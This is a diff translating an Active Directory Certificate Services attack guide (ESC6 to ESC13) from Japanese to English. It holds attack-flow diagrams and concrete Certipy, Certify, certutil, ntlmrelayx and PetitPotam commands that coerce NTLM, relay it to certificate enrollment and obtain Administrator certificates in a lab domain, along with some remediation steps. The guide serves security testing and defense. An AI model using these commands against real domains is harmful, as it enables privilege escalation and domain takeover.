-    participant T as 証明書テンプレート
+    participant T as Certificate Template
     participant DC as Domain Controller
-    
-    Note over A: パターン 1: ManageCA 権限
-    
-    A->>CA: CA への権限確認
-    CA->>A: ManageCA 権限あり
-    
+
+    Note over A: Pattern 1: ManageCA rights
+
+    A->>CA: Check rights on CA
+    CA->>A: ManageCA rights present
+
     A->>CA: certutil -setreg policy\EditFlags<br/>+EDITF_ATTRIBUTESUBJECTALTNAME2
-    
-    Note over CA: ESC6 条件を作成
-    
-    CA->>A: 設定変更完了
-    
-    A->>CA: ESC6 攻撃実行<br/>(SAN 指定で証明書要求)
-    CA->>A: Administrator 証明書発行
-    
-    Note over A: パターン 2: ManageCertificates 権限
-    
-    A->>CA: 任意のテンプレートで証明書要求
-    Note over A: 意図的に失敗させる<br/>(承認待ちにする)
-    
-    CA->>CA: 要求を保留状態に
-    
+
+    Note over CA: Create ESC6 condition
+
+    CA->>A: Configuration change complete
+
+    A->>CA: Execute ESC6 attack<br/>(request certificate with SAN)
+    CA->>A: Issue Administrator certificate
+
+    Note over A: Pattern 2: ManageCertificates rights
+
+    A->>CA: Request certificate with any template
+    Note over A: Intentionally fail<br/>(place request in pending state)
+
+    CA->>CA: Hold request in pending state
+
     A->>CA: certutil -resubmit [RequestId]
-    Note over A: ManageCertificates 権限で<br/>自分の要求を承認
-    
-    CA->>A: 証明書発行
-    
-    Note over A: パターン 3: SubCA テンプレート有効化
-    
+    Note over A: Approve own request<br/>using ManageCertificates rights
+
+    CA->>A: Issue certificate
+
+    Note over A: Pattern 3: Enable SubCA template
+
     A->>CA: certutil -CATemplate +SubCA
-    Note over A: ManageCA 権限で<br/>SubCA テンプレートを有効化
-    
-    A->>T: SubCA 証明書要求
-    T->>CA: 要求転送
-    CA->>CA: 要求を保留
-    
+    Note over A: Enable SubCA template<br/>using ManageCA rights
+
+    A->>T: Request SubCA certificate
+    T->>CA: Forward request
+    CA->>CA: Hold request
+
     A->>CA: certutil -resubmit [RequestId]
-    Note over A: ManageCA 権限があれば<br/>SubCA も承認可能
-    
-    CA->>A: SubCA 証明書発行
-    Note over A: SubCA 証明書で<br/>任意の証明書に署名可能
-    
-    A->>DC: 偽造した証明書で認証
-    DC->>A: TGT 発行
+    Note over A: ManageCA rights also allow<br/>approving SubCA
+
+    CA->>A: Issue SubCA certificate
+    Note over A: With SubCA certificate,<br/>any certificate can be signed
+
+    A->>DC: Authenticate with forged certificate
+    DC->>A: Issue TGT
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. 権限確認**
+**1. Check Permissions**
 
 ```powershell
-# Certify で CA 権限確認
+# Check CA permissions with Certify
 .\Certify.exe find /vulnerable
 
-# 出力で ManageCA / ManageCertificates を確認
+# Check output for ManageCA / ManageCertificates
 ```
 
-**2. パターン 1: ManageCA で ESC6 を有効化**
+**2. Pattern 1: Enable ESC6 via ManageCA**
 
 ```powershell
-# EDITF_ATTRIBUTESUBJECTALTNAME2 を有効化
+# Enable EDITF_ATTRIBUTESUBJECTALTNAME2
 certutil -config "DC01\corp-DC01-CA" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 
-# CA 再起動
+# Restart CA
 Restart-Service certsvc
 
-# ESC6 攻撃実行
+# Execute ESC6 attack
 .\Certify.exe request /ca:DC01\corp-DC01-CA /template:User /altname:Administrator
 ```
 
-**3. パターン 2: ManageCertificates で承認**
+**3. Pattern 2: Approve Requests via ManageCertificates**
 
 ```powershell
-# 証明書要求 (失敗させる)
+# Request certificate (cause intentional failure)
 .\Certify.exe request /ca:DC01\corp-DC01-CA /template:RequireManagerApproval /altname:Administrator
 
-# Request ID を確認
-# 例: Request ID: 1234
+# Note the Request ID
+# Example: Request ID: 1234
 
-# 要求を承認
+# Approve the request
 certutil -config "DC01\corp-DC01-CA" -resubmit 1234
 
-# 証明書取得
+# Retrieve certificate
 certutil -config "DC01\corp-DC01-CA" -retrieve 1234 admin.cer
 ```
 
-**4. パターン 3: SubCA 攻撃**
+**4. Pattern 3: SubCA Attack**
 
 ```bash
-# Linux: Certipy で SubCA テンプレートを有効化・悪用
+# Linux: Enable and abuse SubCA template with Certipy
 certipy ca -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -enable-template 'SubCA'
 
-# SubCA 証明書要求
+# Request SubCA certificate
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'SubCA' -upn 'administrator@corp.local'
 
-# Request ID を取得して承認が必要な場合
-# ManageCA または ManageCertificates 権限で承認
+# If approval is needed after obtaining Request ID,
+# approve with ManageCA or ManageCertificates rights
 ```
 
 ---
 
 ## ESC8: NTLM Relay to AD CS Web Enrollment
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ AD CS Web Enrollment が **HTTP** (非暗号化) で稼働している
-- ✅ NTLM 認証が有効
-- ✅ 攻撃者が Domain Admin などの特権アカウントの NTLM 認証を強制できる (Coercion)
+- ✅ AD CS Web Enrollment is running over **HTTP** (unencrypted)
+- ✅ NTLM authentication is enabled
+- ✅ The attacker can force NTLM authentication from a privileged account such as Domain Admin (Coercion)
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者<br/>(Relay サーバー)
-    participant V as 被害者<br/>(Domain Admin)
+    participant A as Attacker<br/>(Relay Server)
+    participant V as Victim<br/>(Domain Admin)
     participant R as ntlmrelayx
     participant W as Web Enrollment<br/>(HTTP)
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
-    Note over A: 準備: Relay サーバー起動
-    
+
+    Note over A: Preparation: Start relay server
+
     A->>R: ntlmrelayx.py -t<br/>http://ca01/certsrv/certfnsh.asp<br/>--adcs --template User
-    
-    Note over R: Web Enrollment への Relay 待機
-    
-    Note over A: Coercion 攻撃実行
-    
-    A->>V: PetitPotam / PrinterBug<br/>で NTLM 認証を強制
-    
-    Note over V: DC01$ または Domain Admin が<br/>攻撃者に NTLM 認証を試行
-    
-    V->>R: NTLM 認証試行<br/>(SMB / HTTP)
-    
-    Note over R: NTLM Challenge-Response を<br/>キャプチャ
-    
-    R->>W: NTLM を Web Enrollment に Relay
+
+    Note over R: Listening for relay to Web Enrollment
+
+    Note over A: Execute coercion attack
+
+    A->>V: Force NTLM authentication via<br/>PetitPotam / PrinterBug
+
+    Note over V: DC01$ or Domain Admin attempts<br/>NTLM authentication to attacker
+
+    V->>R: NTLM authentication attempt<br/>(SMB / HTTP)
+
+    Note over R: Capture NTLM<br/>Challenge-Response
+
+    R->>W: Relay NTLM to Web Enrollment
     Note over R: http://ca01/certsrv/certfnsh.asp
-    
-    W->>W: Domain Admin / DC01$ として認証
-    Note over W: HTTP で NTLM を受け入れ
-    
-    R->>W: 証明書要求<br/>(User テンプレート)
-    Note over R: Domain Admin の証明書を要求
-    
-    W->>CA: 証明書登録要求
-    CA->>W: Domain Admin 証明書発行
-    W->>R: 証明書 (PFX) を返す
-    
-    R->>A: administrator.pfx 保存
-    
-    Note over A: 認証フェーズ
-    
+
+    W->>W: Authenticate as Domain Admin / DC01$
+    Note over W: Accept NTLM over HTTP
+
+    R->>W: Certificate request<br/>(User template)
+    Note over R: Request Domain Admin's certificate
+
+    W->>CA: Certificate enrollment request
+    CA->>W: Issue Domain Admin certificate
+    W->>R: Return certificate (PFX)
+
+    R->>A: Save administrator.pfx
+
+    Note over A: Authentication phase
+
     A->>DC: certipy auth -pfx administrator.pfx
     DC->>A: Domain Admin TGT / NTLM Hash
-    
-    Note over A: Domain Admin 権限取得
+
+    Note over A: Domain Admin privileges obtained
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. Web Enrollment の確認**
+**1. Check Web Enrollment**
 
 ```bash
-# HTTP で稼働しているか確認
+# Check if running over HTTP
 curl -I http://ca01.corp.local/certsrv/
 
-# HTTPS の場合、ESC8 は使用できない
+# If HTTPS, ESC8 is not applicable
 ```
 
-**2. ntlmrelayx のセットアップ**
+**2. Set Up ntlmrelayx**
 
 ```bash
-# Impacket の ntlmrelayx を使用
+# Use Impacket's ntlmrelayx
 impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template User
 
-# または DomainController テンプレート
+# Or use DomainController template
 impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
 ```
 
-**3. Coercion 攻撃の実行**
+**3. Execute Coercion Attack**
 
 ```bash
-# PetitPotam で DC の NTLM を強制
+# Force DC's NTLM with PetitPotam
 python3 PetitPotam.py -u john -p 'Password123!' -d corp.local 10.10.10.50 10.10.10.100
 
-# 10.10.10.50 = 攻撃者の Relay サーバー
-# 10.10.10.100 = DC01 (被害者)
+# 10.10.10.50 = attacker's relay server
+# 10.10.10.100 = DC01 (victim)
 ```
 
 ```bash
-# PrinterBug で DC の NTLM を強制
+# Force DC's NTLM with PrinterBug
 python3 dementor.py -u john -p 'Password123!' -d corp.local 10.10.10.50 10.10.10.100
 ```
 
-**4. 証明書の取得と認証**
+**4. Retrieve Certificate and Authenticate**
 
 ```bash
-# ntlmrelayx が自動的に証明書を保存
-# 出力例: dc01.pfx
+# ntlmrelayx automatically saves the certificate
+# Example output: dc01.pfx
 
-# 認証
+# Authenticate
 certipy auth -pfx dc01.pfx -dc-ip 10.10.10.100
 
-# DC の NTLM ハッシュまたは TGT を取得
+# Obtain DC's NTLM hash or TGT
 ```
 
-**5. 防御策の確認**
+**5. Check Defenses**
 
 ```powershell
-# Extended Protection for Authentication (EPA) の確認
+# Check Extended Protection for Authentication (EPA)
 Get-WebConfiguration -Filter "system.webServer/security/authentication/windowsAuthentication" -PSPath "IIS:\Sites\Default Web Site\CertSrv"
 
-# EPA が無効の場合、ESC8 が可能
+# If EPA is disabled, ESC8 is possible
 ```
 
 ---
 
 ## ESC9: No Security Extension on Certificate Template
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ 証明書テンプレートに **CT_FLAG_NO_SECURITY_EXTENSION** フラグが設定されている
-- ✅ **msPKI-Enrollment-Flag** に **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** が含まれる
-- ✅ 弱い証明書マッピング (UPN マッピング) が有効
+- ✅ The certificate template has the **CT_FLAG_NO_SECURITY_EXTENSION** flag set
+- ✅ **msPKI-Enrollment-Flag** includes **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**
+- ✅ Weak certificate mapping (UPN mapping) is enabled
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
-    participant T as 脆弱なテンプレート
+    participant A as Attacker
+    participant T as Vulnerable Template
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
-    Note over T: 条件:<br/>CT_FLAG_NO_SECURITY_EXTENSION<br/>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
-    
-    A->>T: 証明書要求
+
+    Note over T: Conditions:<br/>CT_FLAG_NO_SECURITY_EXTENSION<br/>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
+
+    A->>T: Certificate request
     Note over A: SAN UPN:<br/>Administrator@corp.local
-    
-    T->>CA: 証明書リクエスト
-    
-    CA->>CA: Security Extension を生成しない
-    Note over CA: CT_FLAG_NO_SECURITY_EXTENSION<br/>→ szOID_NTDS_CA_SECURITY_EXT なし
-    
-    CA->>A: 証明書発行<br/>(Security Extension なし)
-    
-    Note over A: Security Extension がないため<br/>SID 検証がスキップされる
-    
-    A->>DC: 証明書で認証
-    
-    DC->>DC: 証明書マッピング確認
-    Note over DC: CertificateMappingMethods<br/>に UPN マッピングが含まれる
-    
-    DC->>DC: Security Extension がない<br/>→ SID 検証をスキップ
-    
-    DC->>DC: UPN のみで認証
-    Note over DC: SAN UPN: Administrator@corp.local<br/>→ Administrator として認証
-    
-    DC->>A: Administrator TGT 発行
-    
-    Note over A: Domain Admin 権限取得
+
+    T->>CA: Certificate request
+
+    CA->>CA: Do not generate Security Extension
+    Note over CA: CT_FLAG_NO_SECURITY_EXTENSION<br/>→ No szOID_NTDS_CA_SECURITY_EXT
+
+    CA->>A: Issue certificate<br/>(without Security Extension)
+
+    Note over A: SID validation is skipped<br/>because Security Extension is absent
+
+    A->>DC: Authenticate with certificate
+
+    DC->>DC: Check certificate mapping
+    Note over DC: CertificateMappingMethods<br/>includes UPN mapping
+
+    DC->>DC: No Security Extension<br/>→ Skip SID validation
+
+    DC->>DC: Authenticate by UPN only
+    Note over DC: SAN UPN: Administrator@corp.local<br/>→ Authenticate as Administrator
+
+    DC->>A: Issue Administrator TGT
+
+    Note over A: Domain Admin privileges obtained
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. 脆弱性スキャン**
+**1. Vulnerability Scan**
 
 ```bash
-# ESC9 を特定
+# Identify ESC9
 certipy find -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -vulnerable -stdout | grep -A 20 "ESC9"
 ```
 
-**2. 証明書要求**
+**2. Certificate Request**
 
 ```bash
-# Administrator UPN で証明書要求
+# Request certificate with Administrator UPN
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'ESC9Template' -upn 'administrator@corp.local'
 
-# 出力: administrator.pfx
+# Output: administrator.pfx
 ```
 
-**3. 認証**
+**3. Authentication**
 
 ```bash
-# 弱いマッピングを利用して認証
+# Authenticate using weak mapping
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
 
-# UPN マッピングで Administrator として認証される
+# Authenticated as Administrator via UPN mapping
 ```
 
-**4. 証明書マッピング設定の確認 (DC)**
+**4. Check Certificate Mapping Setting (on DC)**
 
 ```powershell
-# レジストリで確認
+# Check via registry
 Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" -Name "CertificateMappingMethods"
 
-# 値に 0x4 (UPN) が含まれるか確認
+# Check if value includes 0x4 (UPN)
 # 0x1 = Subject/Issuer
-# 0x2 = Issuer Only  
-# 0x4 = UPN (弱い)
+# 0x2 = Issuer Only
+# 0x4 = UPN (weak)
 ```
 
 ---
 
 ## ESC10: Weak Certificate Mapping for Schannel Authentication
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ **CertificateMappingMethods** が **0x4** (UPN マッピングのみ) に設定されている
-- ✅ 攻撃者が任意の UPN を持つ証明書を取得できる
+- ✅ **CertificateMappingMethods** is set to **0x4** (UPN mapping only)
+- ✅ The attacker can obtain a certificate with an arbitrary UPN
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
+    participant A as Attacker
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
-    Note over DC: 設定:<br/>CertificateMappingMethods = 0x4<br/>(UPN マッピングのみ)
-    
-    Note over A: 任意の証明書を取得<br/>(ESC1/2/3/6 など)
-    
-    A->>CA: 証明書要求
+
+    Note over DC: Setting:<br/>CertificateMappingMethods = 0x4<br/>(UPN mapping only)
+
+    Note over A: Obtain arbitrary certificate<br/>(via ESC1/2/3/6 etc.)
+
+    A->>CA: Certificate request
     Note over A: SAN UPN:<br/>Administrator@corp.local
-    
-    CA->>A: 証明書発行
-    
-    Note over A: Schannel 経由で認証
-    
-    A->>DC: PKINIT / Schannel 認証<br/>(証明書提示)
-    
-    DC->>DC: 証明書マッピング処理
-    Note over DC: CertificateMappingMethods = 0x4<br/>→ UPN のみでマッピング
-    
-    DC->>DC: SID や Issuer を検証しない
-    Note over DC: 弱いマッピング
-    
-    DC->>DC: UPN: Administrator@corp.local<br/>→ Administrator アカウントを検索
-    
-    DC->>A: Administrator として認証成功
-    
-    A->>DC: TGT 要求
-    DC->>A: Administrator TGT 発行
-    
-    Note over A: Domain Admin 権限取得
+
+    CA->>A: Issue certificate
+
+    Note over A: Authenticate via Schannel
+
+    A->>DC: PKINIT / Schannel authentication<br/>(present certificate)
+
+    DC->>DC: Process certificate mapping
+    Note over DC: CertificateMappingMethods = 0x4<br/>→ Map by UPN only
+
+    DC->>DC: Do not validate SID or Issuer
+    Note over DC: Weak mapping
+
+    DC->>DC: UPN: Administrator@corp.local<br/>→ Look up Administrator account
+
+    DC->>A: Authentication successful as Administrator
+
+    A->>DC: TGT request
+    DC->>A: Issue Administrator TGT
+
+    Note over A: Domain Admin privileges obtained
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. 証明書マッピング設定の確認**
+**1. Check Certificate Mapping Setting**
 
 ```powershell
-# DC のレジストリを確認
+# Check DC registry
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" /v CertificateMappingMethods
 
-# 0x4 (UPN) の場合、ESC10 が可能
+# If 0x4 (UPN), ESC10 is possible
 ```
 
-**2. 証明書取得 (他の ESC を使用)**
+**2. Obtain Certificate (using another ESC)**
 
 ```bash
-# ESC1 などで Administrator の証明書を取得
+# Obtain Administrator's certificate with ESC1 etc.
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'VulnerableTemplate' -upn 'administrator@corp.local'
 ```
 
-**3. 認証**
+**3. Authentication**
 
 ```bash
-# 弱いマッピングで認証
+# Authenticate with weak mapping
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
 
-# UPN のみでマッピングされ、Administrator として認証される
+# Mapped by UPN only, authenticated as Administrator
 ```
 
-**4. 修正方法 (防御側)**
+**4. Remediation (Defender)**
 
 ```powershell
-# 強い証明書マッピングを強制
+# Enforce strong certificate mapping
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" -Name "CertificateMappingMethods" -Value 0x3
 
-# 0x1 = Subject/Issuer (強い)
-# 0x2 = Issuer Only (強い)
-# 0x3 = Subject/Issuer + Issuer Only (推奨)
+# 0x1 = Subject/Issuer (strong)
+# 0x2 = Issuer Only (strong)
+# 0x3 = Subject/Issuer + Issuer Only (recommended)
 
-# または StrongCertificateBindingEnforcement を有効化
+# Or enable StrongCertificateBindingEnforcement
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name "StrongCertificateBindingEnforcement" -Value 2
 ```
 
@@ -1039,533 +1040,533 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name "Stro
 
 ## ESC11: NTLM Relay to AD CS RPC Interface
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ AD CS の **RPC インターフェース** (ICertPassage) が NTLM 認証を受け付ける
-- ✅ 攻撃者が Domain Admin などの特権アカウントの NTLM 認証を強制できる
+- ✅ The AD CS **RPC interface** (ICertPassage) accepts NTLM authentication
+- ✅ The attacker can force NTLM authentication from a privileged account such as Domain Admin
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者<br/>(Relay サーバー)
-    participant V as 被害者<br/>(Domain Admin)
+    participant A as Attacker<br/>(Relay Server)
+    participant V as Victim<br/>(Domain Admin)
     participant R as ntlmrelayx
     participant RPC as AD CS RPC<br/>(ICertPassage)
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
-    Note over A: 準備: RPC Relay サーバー起動
-    
+
+    Note over A: Preparation: Start RPC relay server
+
     A->>R: ntlmrelayx.py -t rpc://ca01.corp.local<br/>--adcs --template User
-    
-    Note over R: ICertPassage RPC への Relay 待機
-    
-    Note over A: Coercion 攻撃実行
-    
-    A->>V: PetitPotam で NTLM 認証を強制
-    
-    V->>R: NTLM 認証試行
-    
-    Note over R: NTLM Challenge-Response を<br/>キャプチャ
-    
-    R->>RPC: NTLM を RPC Interface に Relay
-    Note over R: ICertPassage RPC<br/>(135/593 ポート経由)
-    
-    RPC->>RPC: Domain Admin として認証
-    Note over RPC: NTLM 認証が成功
-    
-    R->>RPC: 証明書要求<br/>(RPC経由)
-    Note over R: CertServerRequest メソッド呼び出し
-    
-    RPC->>CA: 証明書登録要求
-    CA->>RPC: Domain Admin 証明書発行
-    RPC->>R: 証明書 (PFX) を返す
-    
-    R->>A: administrator.pfx 保存
-    
-    Note over A: 認証フェーズ
-    
+
+    Note over R: Listening for relay to ICertPassage RPC
+
+    Note over A: Execute coercion attack
+
+    A->>V: Force NTLM authentication via PetitPotam
+
+    V->>R: NTLM authentication attempt
+
+    Note over R: Capture NTLM<br/>Challenge-Response
+
+    R->>RPC: Relay NTLM to RPC Interface
+    Note over R: ICertPassage RPC<br/>(via port 135/593)
+
+    RPC->>RPC: Authenticate as Domain Admin
+    Note over RPC: NTLM authentication successful
+
+    R->>RPC: Certificate request<br/>(via RPC)
+    Note over R: Call CertServerRequest method
+
+    RPC->>CA: Certificate enrollment request
+    CA->>RPC: Issue Domain Admin certificate
+    RPC->>R: Return certificate (PFX)
+
+    R->>A: Save administrator.pfx
+
+    Note over A: Authentication phase
+
     A->>DC: certipy auth -pfx administrator.pfx
     DC->>A: Domain Admin TGT
-    
-    Note over A: Domain Admin 権限取得
+
+    Note over A: Domain Admin privileges obtained
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. ntlmrelayx のセットアップ (RPC モード)**
+**1. Set Up ntlmrelayx (RPC Mode)**
 
 ```bash
-# Impacket の ntlmrelayx で RPC Interface を狙う
+# Target RPC Interface with Impacket's ntlmrelayx
 impacket-ntlmrelayx -t rpc://ca01.corp.local -rpc-mode TSCH -smb2support --adcs --template User
 
-# または Certipy の Relay 機能
+# Or use Certipy's relay feature
 certipy relay -ca ca01.corp.local
 ```
 
-**2. Coercion 攻撃の実行**
+**2. Execute Coercion Attack**
 
 ```bash
-# PetitPotam で DC の NTLM を強制
+# Force DC's NTLM with PetitPotam
 python3 PetitPotam.py -u john -p 'Password123!' -d corp.local 10.10.10.50 10.10.10.100
 
-# 10.10.10.50 = 攻撃者の Relay サーバー
+# 10.10.10.50 = attacker's relay server
 # 10.10.10.100 = DC01
 ```
 
-**3. 証明書の取得と認証**
+**3. Retrieve Certificate and Authenticate**
 
 ```bash
-# Relay が成功すると自動的に証明書を取得
-# 出力: dc01.pfx
+# Certificate is automatically obtained when relay succeeds
+# Output: dc01.pfx
 
-# 認証
+# Authenticate
 certipy auth -pfx dc01.pfx -dc-ip 10.10.10.100
 ```
 
-**4. 防御策**
+**4. Defenses**
 
 ```powershell
-# RPC での NTLM 認証を無効化 (GPO)
+# Disable NTLM authentication over RPC (GPO)
 # Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
 # "Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers" = "Deny all"
 
-# または EPA (Extended Protection for Authentication) を有効化
+# Or enable EPA (Extended Protection for Authentication)
 ```
 
 ---
 
 ## ESC12: YubiHSM2 Vulnerability
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ AD CS が **YubiHSM2** ハードウェアセキュリティモジュールを使用
-- ✅ YubiHSM2 に既知の脆弱性が存在 (特定のファームウェアバージョン)
-- ✅ 攻撃者が HSM へのアクセス権を持つ
+- ✅ AD CS uses a **YubiHSM2** hardware security module
+- ✅ A known vulnerability exists in YubiHSM2 (specific firmware version)
+- ✅ The attacker has access to the HSM
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
+    participant A as Attacker
     participant HSM as YubiHSM2
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
-    Note over HSM: YubiHSM2 に脆弱性<br/>(例: CVE-XXXX-XXXX)
-    
-    A->>HSM: 脆弱性スキャン
-    HSM->>A: 脆弱なファームウェア検出
-    
-    Note over A: Exploit 実行
-    
-    A->>HSM: YubiHSM2 Exploit<br/>(Firmware 脆弱性)
-    
-    HSM->>HSM: マスターキーへの<br/>不正アクセス
-    
-    HSM->>A: HSM のマスターキー取得
-    
-    Note over A: CA の秘密鍵抽出
-    
-    A->>CA: CA の秘密鍵を抽出
-    Note over A: HSM から CA の<br/>署名鍵を取得
-    
-    CA->>A: CA 秘密鍵 (RSA/ECC)
-    
-    Note over A: 任意の証明書に署名可能
-    
-    A->>A: 偽造証明書を作成
+
+    Note over HSM: YubiHSM2 has a vulnerability<br/>(e.g., CVE-XXXX-XXXX)
+
+    A->>HSM: Vulnerability scan
+    HSM->>A: Vulnerable firmware detected
+
+    Note over A: Execute exploit
+
+    A->>HSM: YubiHSM2 Exploit<br/>(Firmware vulnerability)
+
+    HSM->>HSM: Unauthorized access<br/>to master key
+
+    HSM->>A: Obtain HSM master key
+
+    Note over A: Extract CA private key
+
+    A->>CA: Extract CA private key
+    Note over A: Retrieve CA signing key<br/>from HSM
+
+    CA->>A: CA private key (RSA/ECC)
+
+    Note over A: Can sign any certificate
+
+    A->>A: Create forged certificate
     Note over A: Subject: Administrator<br/>Issuer: corp-DC01-CA
-    
-    A->>A: CA 秘密鍵で署名
-    
-    Note over A: 偽造証明書で認証
-    
-    A->>DC: 偽造証明書提示
-    DC->>DC: CA の公開鍵で検証
-    Note over DC: 署名が有効<br/>(CA 秘密鍵で署名されている)
-    
-    DC->>A: Administrator TGT 発行
-    
-    Note over A: Domain Admin 権限取得
+
+    A->>A: Sign with CA private key
+
+    Note over A: Authenticate with forged certificate
+
+    A->>DC: Present forged certificate
+    DC->>DC: Verify with CA public key
+    Note over DC: Signature is valid<br/>(signed with CA private key)
+
+    DC->>A: Issue Administrator TGT
+
+    Note over A: Domain Admin privileges obtained
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**注意**: ESC12 は非常に特殊で、YubiHSM2 の特定脆弱性に依存します。実際の攻撃コマンドは CVE に依存。
+**Note**: ESC12 is highly specific and depends on a particular YubiHSM2 vulnerability. Actual attack commands depend on the CVE.
 
-**1. YubiHSM2 の検出**
+**1. Detect YubiHSM2**
 
 ```bash
-# CA サーバーで YubiHSM2 の使用を確認
+# Confirm YubiHSM2 usage on the CA server
 certutil -store my
 
-# または
+# Or
 Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.PrivateKey.CspKeyContainerInfo.ProviderName -like "*Yubi*"}
 ```
 
-**2. 脆弱性の確認 (仮想例)**
+**2. Check Vulnerability (hypothetical example)**
 
 ```bash
-# YubiHSM2 のファームウェアバージョン確認
-# (実際のツールは CVE に依存)
+# Check YubiHSM2 firmware version
+# (Actual tool depends on CVE)
 
-# 脆弱なバージョンの場合、Exploit を実行
+# If a vulnerable version is found, run exploit
 ```
 
-**3. CA 秘密鍵の抽出 (概念)**
+**3. Extract CA Private Key (conceptual)**
 
 ```bash
-# HSM から秘密鍵を抽出 (仮想例)
-# 実際の方法は脆弱性に依存
+# Extract private key from HSM (hypothetical example)
+# Actual method depends on vulnerability
 
-# 抽出した秘密鍵を使用して証明書に署名
+# Sign a certificate using extracted private key
 openssl req -new -x509 -key ca_private_key.pem -out fake_cert.pem -days 365 -subj "/CN=Administrator"
 ```
 
-**4. 偽造証明書での認証**
+**4. Authenticate with Forged Certificate**
 
 ```bash
-# 偽造証明書を PFX に変換
+# Convert forged certificate to PFX
 openssl pkcs12 -export -out fake_admin.pfx -inkey user_key.pem -in fake_cert.pem
 
-# 認証
+# Authenticate
 certipy auth -pfx fake_admin.pfx -dc-ip 10.10.10.100
 ```
 
-**5. 防御策**
+**5. Defenses**
 
 ```powershell
-# YubiHSM2 のファームウェアを最新に更新
-# YubiHSM2 のアクセス制御を厳格化
-# HSM のログ監視を強化
+# Update YubiHSM2 firmware to latest version
+# Strengthen YubiHSM2 access controls
+# Enhance HSM log monitoring
 ```
 
 ---
 
 ## ESC13: Issuance Policy with Privileged Group Linked
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ 証明書テンプレートに **Issuance Policy** OID が設定されている
-- ✅ その OID が **特権グループ** (Domain Admins, Enterprise Admins など) にリンクされている
-- ✅ 低特権ユーザーがそのテンプレートに登録可能
+- ✅ The certificate template has an **Issuance Policy** OID set
+- ✅ That OID is linked to a **privileged group** (Domain Admins, Enterprise Admins, etc.)
+- ✅ A low-privileged user can enroll in that template
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者<br/>(低特権ユーザー)
-    participant T as 証明書テンプレート
+    participant A as Attacker<br/>(Low-Privileged User)
+    participant T as Certificate Template
     participant CA as Certificate Authority
     participant DC as Domain Controller
     participant AD as Active Directory
-    
-    Note over T: Issuance Policy OID:<br/>1.2.3.4.5.6.7.8.9<br/>→ Domain Admins にリンク
-    
+
+    Note over T: Issuance Policy OID:<br/>1.2.3.4.5.6.7.8.9<br/>→ Linked to Domain Admins
+
     Note over AD: msDS-OIDToGroupLink:<br/>OID 1.2.3.4.5.6.7.8.9 =<br/>CN=Domain Admins,CN=Users,DC=corp,DC=local
-    
-    A->>T: 証明書要求
-    Note over A: 低特権ユーザーでも<br/>登録可能なテンプレート
-    
-    T->>CA: 証明書リクエスト
-    
-    CA->>A: Issuance Policy 付き証明書発行
-    Note over CA: 証明書に OID 1.2.3.4.5.6.7.8.9<br/>が含まれる
-    
-    Note over A: 認証フェーズ
-    
-    A->>DC: 証明書で認証
+
+    A->>T: Certificate request
+    Note over A: Template that even<br/>low-privileged users can enroll in
+
+    T->>CA: Certificate request
+
+    CA->>A: Issue certificate with Issuance Policy
+    Note over CA: Certificate includes OID 1.2.3.4.5.6.7.8.9
+
+    Note over A: Authentication phase
+
+    A->>DC: Authenticate with certificate
     Note over A: PKINIT / Schannel
-    
-    DC->>DC: 証明書の Issuance Policy 確認
+
+    DC->>DC: Check certificate's Issuance Policy
     Note over DC: OID: 1.2.3.4.5.6.7.8.9
-    
-    DC->>AD: OID のマッピング確認
+
+    DC->>AD: Check OID mapping
     AD->>DC: OID → Domain Admins
-    
